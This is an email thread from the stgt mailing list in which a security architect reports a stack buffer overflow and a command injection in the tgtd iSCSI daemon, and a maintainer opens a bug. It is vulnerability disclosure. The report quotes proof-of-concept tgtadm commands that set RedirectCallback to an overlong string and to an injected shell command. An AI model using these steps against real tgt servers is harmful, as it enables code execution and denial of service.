From: "Hullinger, Jason (Cloud Services)" <jason.hullinger@hp.com>
Subject: Re: tgtd buffer overflow and command injection vulnerabilities
Date: Fri, 13 Jun 2014 19:23:35 +0000
Message-ID: <CFC09B1C.1285F%jason.hullinger@hp.com>
References: <CFBCA7D8.12705%jason.hullinger@hp.com>
 <m3ppidtug5.wl%mitake.hitoshi@lab.ntt.co.jp>
Mime-Version: 1.0
Content-Type: multipart/signed; protocol="application/pkcs7-signature";
	micalg=sha256; boundary="B_3485506899_20577894"
Return-path: <stgt-owner@vger.kernel.org>
In-Reply-To: <m3ppidtug5.wl%mitake.hitoshi@lab.ntt.co.jp>
Content-Language: en-US
Sender: stgt-owner@vger.kernel.org
List-ID: <stgt.vger.kernel.org>
To: Hitoshi Mitake <mitake.hitoshi@gmail.com>
Cc: "stgt@vger.kernel.org" <stgt@vger.kernel.org>

--B_3485506899_20577894
Content-type: text/plain;
	charset="US-ASCII"
Content-transfer-encoding: 7bit

Hi,

There is no patch because I'm a bit confused as to what the proper
functionality is suppose to be. Typically a client/server model does not
allow the client to inject arbitrary commands to the server. This is
because a compromised client may further compromise the server by
injecting malicious commands. Is the intent here to allow the client
(tgtadmn) to inject arbitrary commands to the server (tgtd)? Additionally
though, when str_spacecpy is called, the dest can be smaller than the src
because the src can be 1024 bytes while the dest is set to 256 bytes
causing a stack overflow and possible code execution and/or a denial of
service.

Thanks,

Jason Hullinger

On 6/12/14, 7:27 PM, "Hitoshi Mitake" <mitake.hitoshi@gmail.com> wrote:

>At Tue, 10 Jun 2014 19:17:35 +0000,
>Hullinger, Jason (Cloud Services) wrote:
>> 
>> TGT Team:
>> 
>> The function call_program in the tgtd daemon includes a callback
>>function
>> that will run arbitrary commands. Additionally, it does not check that
>>the
>> cmd argument is smaller than the allocated buffer size causing a buffer
>> overflow. Example and proof of concept:
>> 
>> usr/tgtd.c
>> 
>> int call_program(const char *cmd, void (*callback)(void *data, int
>>result),
>> 		void *data, char *output, int op_len, int flags)
>> ...
>> char *pos, arg[256];
>> ...
>> str_spacecpy(&pos, cmd);
>> 
>> Where str_spacecpy (usr/tgtd.c) chops multiple white spaces into one
>>white
>> space. It takes a dest buffer and copies into a src buffer:
>> 
>> void str_spacecpy(char **dest, const char *src)
>> 
>> call_program is called from usr/target.c in get_redirect_address
>> 
>> static int
>> get_redirect_address(char *callback, char *buffer, int buflen,
>> 			char **address, char **ip_port, int *rsn)
>> ...
>> if (call_program(callback, NULL, NULL, buffer, buflen, 0))
>> ...
>> 
>> Where get_redirect_address is called from usr/target.c by:
>> 
>> int target_redirected(struct iscsi_target *target,
>> 	struct iscsi_connection *conn, char *buf, int *reason)
>> ...
>> char dst[INET6_ADDRSTRLEN], in_buf[1024];
>>  ...
>> 		ret = get_redirect_address(in_buf, buffer,
>> 					sizeof(buffer), &addr, &port, &rsn);
>> ...
>> 
>> in_buf, size 1024, is passed to call_program as 'cmd', which then copies
>> into the dest char buffer of size 256 causing a buffer overflow.
>> 
>> In addition to that, any arbitrary command line argument that is pass in
>> by tgtadm will be executed. Example:
>> 
>> sudo tgtd -C 1 --iscsi portal=127.0.0.1:860
>> sudo ./scripts/tgt-admin -C 1  -e -c /home/ubuntu/tgt/targets.confg
>> 
>> (in a different shell) sudo gdb --args tgtd -f -C 2 --iscsi
>> portal=127.0.0.1
>> sudo ./scripts/tgt-admin -C 2  -e -c /home/ubuntu/tgt/targets.confg
>> 
>> sudo tgtadm -C 2 --op update --mode target --tid 1 --name
>>RedirectAddress
>> --value 127.0.0.1
>> sudo tgtadm -C 2 --op update --mode target --tid 1 --name RedirectPort
>> --value 860
>> sudo tgtadm -C 2 --op update --mode target --tid 1 --name RedirectReason
>> --value Temporary
>> 
>> sudo tgtadm -C 2 --op update --mode target --tid 1 --name
>>RedirectCallback
>> --value 
>> 
>>1zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
>>zz
>> 
>>zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
>>zz
>> 
>>zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
>>zz
>> 
>>zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
>>zz
>> 
>>zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
>>zz
>> 
>>zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
>>zz
>> zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
>> 
>> sudo iscsiadm -m discovery -t st -p 127.0.0.1
>> sudo iscsiadm -m node -p 127.0.0.1 -l
>> 
>> Upon attempting to authenticate, the command set by the --name
>> RedirectCallback --value tgtadm directive will attempt to be executed.
>>If
>> you replace the above example with:
>> 
>> sudo tgtadm -C 2 --op update --mode target --tid 1 --name
>>RedirectCallback
>> --value "/usr/bin/logger `whoami`"
>> 
>> You will see in the syslog file, where 'ubuntu' is the current user:
>> 
>> ubuntu iqn.2014-05.local.localhost:foobar 127.0.0.1
>> 
>> I'm a bit unclear as to what exactly is suppose to happen here, or what
>> the intended result is, but it seems that arbitrary commands should not
>>be
>> allowed to be injected from tgtadm in addition to checking the strlen of
>> cmd.
>> 
>> Thanks, and let me know if I can answer or clarify any questions.
>
>I'm still not digging in the problem, but it seems to be very
>important. I added a new issue in the launchpad tracker:
>
>https://bugs.launchpad.net/tgt-project/+bug/1329586
>
>I'd like to fix it when I can allocate time for it, or have you
>already created a patch for it?
>
>Thanks,
>Hitoshi
>
>> 
>> Jason Hullinger
>> 
>> Security Architect
>> HP Helion Cloud
>> 
>> --
>> To unsubscribe from this list: send the line "unsubscribe stgt" in
>> the body of a message to majordomo@vger.kernel.org
>> More majordomo info at  http://vger.kernel.org/majordomo-info.html

--B_3485506899_20577894
Content-Type: application/pkcs7-signature; name="smime.p7s"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="smime.p7s"

MIIVXwYJKoZIhvcNAQcCoIIVUDCCFUwCAQExDzANBglghkgBZQMEAgEFADALBgkqhkiG9w0B
BwGgghJ/MIIH+TCCBuGgAwIBAgIQbdIXbocPnX0Z/YJTB2NJqDANBgkqhkiG9w0BAQUFADCB
9zELMAkGA1UEBhMCVVMxIDAeBgNVBAoTF0hld2xldHQtUGFja2FyZCBDb21wYW55MR8wHQYD
VQQLExZWZXJpU2lnbiBUcnVzdCBOZXR3b3JrMTswOQYDVQQLEzJUZXJtcyBvZiB1c2UgYXQg
aHR0cHM6Ly93d3cudmVyaXNpZ24uY29tL3JwYSAoYykwOTE1MDMGA1UECxMsQ2xhc3MgMiBN
YW5hZ2VkIFBLSSBJbmRpdmlkdWFsIFN1YnNjcmliZXIgQ0ExMTAvBgNVBAMTKENvbGxhYm9y
YXRpb24gQ2VydGlmaWNhdGlvbiBBdXRob3JpdHkgRzIwHhcNMTQwMTA5MDAwMDAwWhcNMTYw
MTA5MjM1OTU5WjCBnDEgMB4GA1UEChQXSGV3bGV0dC1QYWNrYXJkIENvbXBhbnkxJjAkBgNV
BAsUHUVtcGxveW1lbnQgU3RhdHVzIC0gRW1wbG95ZWVzMQ8wDQYDVQQLEwZTL01JTUUxGDAW
BgNVBAMTD0phc29uIEh1bGxpbmdlcjElMCMGCSqGSIb3DQEJARYWamFzb24uaHVsbGluZ2Vy
QGhwLmNvbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALegybjU91d0HIv1vQdC
JZR5sOec+Zc0grWfabV6Z/DZ9vJGdAaGvQjazwDNHmLdNoIdnMJbdcyYdclFVK1R1Cba2O/A
TJs0w8PYGbPkdd8pUSh0kisxRXgxWX+TfiNZW+x3/c7bDhs0IdAUXD3aj3cGE6pQkOukXgII
iw4x06WQ1iR07gvIu2eTZlvuJ0P4+GRTU1N3N7OKwJOvMPtVWhhaSc5PB8vwkWcNsE0XftGj
nrUkP9ot9sNmJdsMHdOYBe2DlkPAjqlEIRvVOiYwRVgZI77WKOv8RvruxM33fAQH2xz/F9Fy
4CoyTb43DaTr+guY5KEosBPdw8metWgIaa8CAwEAAaOCA9gwggPUMD0GA1UdEQQ2MDSBFmph
c29uLmh1bGxpbmdlckBocC5jb22BGmphc29uLmxlZS5odWxsaW5nZXJAaHAuY29tMAwGA1Ud
EwEB/wQCMAAwDgYDVR0PAQH/BAQDAgWgMFkGA1UdHwRSMFAwTqBMoEqGSGh0dHA6Ly9vbnNp
dGVjcmwudmVyaXNpZ24uY29tL0hld2xldHRQYWNrYXJkQ29tcGFueVNNSU1FRzIvTGF0ZXN0
Q1JMLmNybDAfBgNVHSMEGDAWgBQifdOkq1esVn+pf0FEGpW8W/ir7jAdBgNVHQ4EFgQUgjmF
GxjNLuu7rplihsON0I/PFNIwggEyBggrBgEFBQcBAQSCASQwggEgMCcGCCsGAQUFBzABhhto
dHRwOi8vaHAtb2NzcC52ZXJpc2lnbi5jb20wgfQGCCsGAQUFBzACpIHnMIHkMTEwLwYDVQQD
EyhDb2xsYWJvcmF0aW9uIENlcnRpZmljYXRpb24gQXV0aG9yaXR5IEcyMTAwLgYDVQQLEydD
bGFzcyAyIE9uU2l0ZSBJbmRpdmlkdWFsIFN1YnNjcmliZXIgQ0ExOjA4BgNVBAsTMVRlcm1z
IG9mIHVzZSBhdCBodHRwczovL3d3dy52ZXJpc2lnbi5jb20vcnBhKGMpMDkxHzAdBgNVBAsT
FlZlcmlTaWduIFRydXN0IE5ldHdvcmsxIDAeBgNVBAoTF0hld2xldHQtUGFja2FyZCBDb21w
YW55MIIBPQYDVR0gBIIBNDCCATAwggEsBgtghkgBhvhFAQcXAjCCARswKAYIKwYBBQUHAgEW
HGh0dHBzOi8vd3d3LnZlcmlzaWduLmNvbS9ycGEwge4GCCsGAQUFBwICMIHhMB4WF0hld2xl
dHQtUGFja2FyZCBDb21wYW55MAMCAQIagb5BdXRob3JpdHkgdG8gYmluZCBIUCBkb2VzIG5v
dCBjb3JyZXNwb25kIHdpdGggdXNlIG9yIHBvc3Nlc3Npb24gb2YgdGhpcyBjZXJ0aWZpY2F0
ZS4gSXNzdWVkIHRvIGZhY2lsaXRhdGUgY29tbXVuaWNhdGlvbiB3aXRoIEhQLiBWZXJpU2ln
bidzIENQUyBpbmNvcnAuIEJ5IHJlZmVyZW5jZSBsaWFiLiBsdGQuIChjKTk3IFZlcmlTaWdu
MBYGA1UdJQEB/wQMMAoGCCsGAQUFBwMEMEsGCSqGSIb3DQEJDwQ+MDwwDgYIKoZIhvcNAwIC
AgCAMA4GCCqGSIb3DQMCAgIAQDAOBggqhkiG9w0DBAICAIAwCgYIKoZIhvcNAwcwDQYJKoZI
hvcNAQEFBQADggEBABoMjaPydf4XW8CiI1XsxTG2n5vCZfXKXc/dR0MEJqCT/ZrYrNe3ahFs
zVYMoLFk8sWCqgZsmpJ7OigWnVS0JMN/txBsQ6YT/z3h8SkCPba8AAX8OykkMgqLeiUnCNpg
ArpBgyT944JSmx+OSFDfjFpoNYiG3AJ5EGiwx+n3NMz523KU0gw7XHajFn2v7IhbA16oV/Ya
vsWkeUwBJBF6rnWD366R23LUokkafW3h6/UQYr1GIFPqqgRgTZ0bI/JLYfnEAA27Ok/2bSGk
hKS77HcUyZZpyE89FfT0kB+VlcBHxG6lYz24ax2c6tKqVmHp/7vCgw7fENKGXQYjhRWE4T8w
ggZhMIIFSaADAgECAhA7VxO2sCE1+15GdcpsssThMA0GCSqGSIb3DQEBBQUAMIHKMQswCQYD
VQQGEwJVUzEXMBUGA1UEChMOVmVyaVNpZ24sIEluYy4xHzAdBgNVBAsTFlZlcmlTaWduIFRy
dXN0IE5ldHdvcmsxOjA4BgNVBAsTMShjKSAxOTk5IFZlcmlTaWduLCBJbmMuIC0gRm9yIGF1
dGhvcml6ZWQgdXNlIG9ubHkxRTBDBgNVBAMTPFZlcmlTaWduIENsYXNzIDIgUHVibGljIFBy
aW1hcnkgQ2VydGlmaWNhdGlvbiBBdXRob3JpdHkgLSBHMzAeFw0wOTA5MDIwMDAwMDBaFw0x
OTA5MDEyMzU5NTlaMIH3MQswCQYDVQQGEwJVUzEgMB4GA1UEChMXSGV3bGV0dC1QYWNrYXJk
IENvbXBhbnkxHzAdBgNVBAsTFlZlcmlTaWduIFRydXN0IE5ldHdvcmsxOzA5BgNVBAsTMlRl
cm1zIG9mIHVzZSBhdCBodHRwczovL3d3dy52ZXJpc2lnbi5jb20vcnBhIChjKTA5MTUwMwYD
VQQLEyxDbGFzcyAyIE1hbmFnZWQgUEtJIEluZGl2aWR1YWwgU3Vic2NyaWJlciBDQTExMC8G
A1UEAxMoQ29sbGFib3JhdGlvbiBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0eSBHMjCCASIwDQYJ
KoZIhvcNAQEBBQADggEPADCCAQoCggEBAKdha2jarqqFZAxLy1DLMOhzIY6J/sotb/5GowNu
4yK3coUTI+IPjwb3gUx67QO8Pe0cdVCjz+grzmgBOcVLaFvWo2GbTuZHYlBcs1h7G1IEoysv
sjTuEKB3hM2kIvyVlDmHr/wFeWGCaBAyMrKLBBC0tfzOuIhNlLc6/i8YloXWqkkROI4oG5uA
8uGsi86gL+X+6CC6yTWekoai4hhgqT/u63pU8kYBV5hF/0ijf2t/ScGaCkjVHSJGMq+8JjSP
fs8pYXgyYIbpPpGQwA9zV7+BBlTFHzoOVBHYQCdC8ONA+Kaimtno9R9FIqStRBHUU5veEc3x
PM/Lwz/PnXIDqgsCAwEAAaOCAhIwggIOMBIGA1UdEwEB/wQIMAYBAf8CAQAwcAYDVR0gBGkw
ZzBlBgtghkgBhvhFAQcXAjBWMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy52ZXJpc2lnbi5j
b20vY3BzMCoGCCsGAQUFBwICMB4aHGh0dHBzOi8vd3d3LnZlcmlzaWduLmNvbS9ycGEwNAYD
VR0fBC0wKzApoCegJYYjaHR0cDovL2NybC52ZXJpc2lnbi5jb20vcGNhMi1nMy5jcmwwDgYD
VR0PAQH/BAQDAgEGMC4GA1UdEQQnMCWkIzAhMR8wHQYDVQQDExZQcml2YXRlTGFiZWw0LTIw
NDgtMTQyMB0GA1UdDgQWBBQifdOkq1esVn+pf0FEGpW8W/ir7jCB8AYDVR0jBIHoMIHloYHQ
pIHNMIHKMQswCQYDVQQGEwJVUzEXMBUGA1UEChMOVmVyaVNpZ24sIEluYy4xHzAdBgNVBAsT
FlZlcmlTaWduIFRydXN0IE5ldHdvcmsxOjA4BgNVBAsTMShjKSAxOTk5IFZlcmlTaWduLCBJ
bmMuIC0gRm9yIGF1dGhvcml6ZWQgdXNlIG9ubHkxRTBDBgNVBAMTPFZlcmlTaWduIENsYXNz
IDIgUHVibGljIFByaW1hcnkgQ2VydGlmaWNhdGlvbiBBdXRob3JpdHkgLSBHM4IQYXDLSYxf
mEUp57Cm2VBbejANBgkqhkiG9w0BAQUFAAOCAQEAdoqZeNFwhaMs169I9T6WV8Ogu0yXxIYR
BUkixQrPwW9OtXymgDUb8uKPHDhicfM8vgAlSh6hEMmWO017rCZoo57pWaN4xkebP44wlsqo
1ig5VcfN7cnrspDklTA+tP3v8afJxuE2bChgVCeet6BxOr2rvNB1ItdT87KcWxV1COpJqzQu
U8N8BhR7oPEUiCRtXpFrfmTrYewl1xm1bZk3cAp9CKjDYClVJEwZIgD67DezmWQK+VBk+ofE
VAv9CNB/TFwrUpV7inKrSbf7FqkIIbwzvIR1If11NWxDmtioyQsoFnO5/5wLQTSsO17YBYLo
boLVLG3RgY7bX5288HU2WDCCBBkwggMBAhBhcMtJjF+YRSnnsKbZUFt6MA0GCSqGSIb3DQEB
BQUAMIHKMQswCQYDVQQGEwJVUzEXMBUGA1UEChMOVmVyaVNpZ24sIEluYy4xHzAdBgNVBAsT
FlZlcmlTaWduIFRydXN0IE5ldHdvcmsxOjA4BgNVBAsTMShjKSAxOTk5IFZlcmlTaWduLCBJ
bmMuIC0gRm9yIGF1dGhvcml6ZWQgdXNlIG9ubHkxRTBDBgNVBAMTPFZlcmlTaWduIENsYXNz
IDIgUHVibGljIFByaW1hcnkgQ2VydGlmaWNhdGlvbiBBdXRob3JpdHkgLSBHMzAeFw05OTEw
MDEwMDAwMDBaFw0zNjA3MTYyMzU5NTlaMIHKMQswCQYDVQQGEwJVUzEXMBUGA1UEChMOVmVy
aVNpZ24sIEluYy4xHzAdBgNVBAsTFlZlcmlTaWduIFRydXN0IE5ldHdvcmsxOjA4BgNVBAsT
MShjKSAxOTk5IFZlcmlTaWduLCBJbmMuIC0gRm9yIGF1dGhvcml6ZWQgdXNlIG9ubHkxRTBD
BgNVBAMTPFZlcmlTaWduIENsYXNzIDIgUHVibGljIFByaW1hcnkgQ2VydGlmaWNhdGlvbiBB
dXRob3JpdHkgLSBHMzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAK8KDcLVLNtn
uS3llCfdpb7gsE2Ps2FWPNZ8w/TNPobLooji4dikacW14r/BpkdQXkY5i9WWurVvFL8QzicT
ngVHmzF6E9gf2dMCN4utLEfwjoEGpw0wDOv3PA8gHdxyRu6lAshbw8lWaUzFGMGRewvVEwCb
vO/DSD5GYCCFKtWQts2LoMwy3bf9QFWyUBxWrsyNd03HIE2nMXbvaJKKkB4IgVayrWmjUtDL
HMQjPR+Z/kzoFmOOxgiO9jH20vrldt21HJKjSc3NAc1ozalpuqPrHQ2cpCCmwaDF0UZMF23S
rGY/lozghNQ2/yJZxfkRYKhfBH3yGvYlQmEPxEq4PokCAwEAATANBgkqhkiG9w0BAQUFAAOC
AQEANCYVPMCNTUNJHb3pIZLXZpy33sW40ORdX3YiwCb5hDo6+Yy1++xg8ejOBLDI3acDjzDz
mN+k5qQx39McC0bcciA/ru4FPKQzPws5rHB4c0uZK98wwlSwqDtVof4WKM1CvXRugNsnRKfO
RF3UG5CYDR5ClLEALATQdKMCBSJjY82DtfvBbWJraXX9XXBBufW/fN++wTJzIiGLWIF7FZF6
uuNkSLB/+zYl2pXQ8SQUF90YgGtGIzlU9Y5iCQQdlJCmm+Yl4kJFqriQrb4Ij6kLQhiUz3I5
4bFD4CjPt+dabBNrSbP/4xh8iYszXawz16f52jpVyVgQ+arvWrbPS0vfKjGCAqQwggKgAgEB
MIIBDDCB9zELMAkGA1UEBhMCVVMxIDAeBgNVBAoTF0hld2xldHQtUGFja2FyZCBDb21wYW55
MR8wHQYDVQQLExZWZXJpU2lnbiBUcnVzdCBOZXR3b3JrMTswOQYDVQQLEzJUZXJtcyBvZiB1
c2UgYXQgaHR0cHM6Ly93d3cudmVyaXNpZ24uY29tL3JwYSAoYykwOTE1MDMGA1UECxMsQ2xh
c3MgMiBNYW5hZ2VkIFBLSSBJbmRpdmlkdWFsIFN1YnNjcmliZXIgQ0ExMTAvBgNVBAMTKENv
bGxhYm9yYXRpb24gQ2VydGlmaWNhdGlvbiBBdXRob3JpdHkgRzICEG3SF26HD519Gf2CUwdj
SagwDQYJYIZIAWUDBAIBBQCgaTAvBgkqhkiG9w0BCQQxIgQgaiqEeZz4AnlJlFJArfHcIJSf
S1+fSh696C8cxHBYiJswGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0BCQUx
DxcNMTQwNjEzMTkyMTM5WjANBgkqhkiG9w0BAQEFAASCAQBmmXj6KyrEVNKljeFxxknxiFHa
DMNB9d7ifNpKZiGwUlS3mzwaLKLTFkU3PbmN6eoa1ri40AeLgd7CXD4dmDCG9jFs4AWofga9
zVEEqQkw2giAWvkiLyExIXYRs/coBZANu1bflRDfnlzWUgrVOdyWDJiQwgcRVvQ6p+WFNopZ
5EZPsz39GP+exTW3CcEj3UV9/orRtkrm5bRxvN0kxXkO5V5sCbrI0+vhQRaxWizK2SzXZy7b
teIiy59v/7QMUpOW/kdLXFQVMYWofzruzauHqiS4ulnW7ZDVncFFUpR34e4byY1nwG1AEL4b
XrwZTcmVSmZjWhp2CmjXpkUbNAdU

--B_3485506899_20577894--
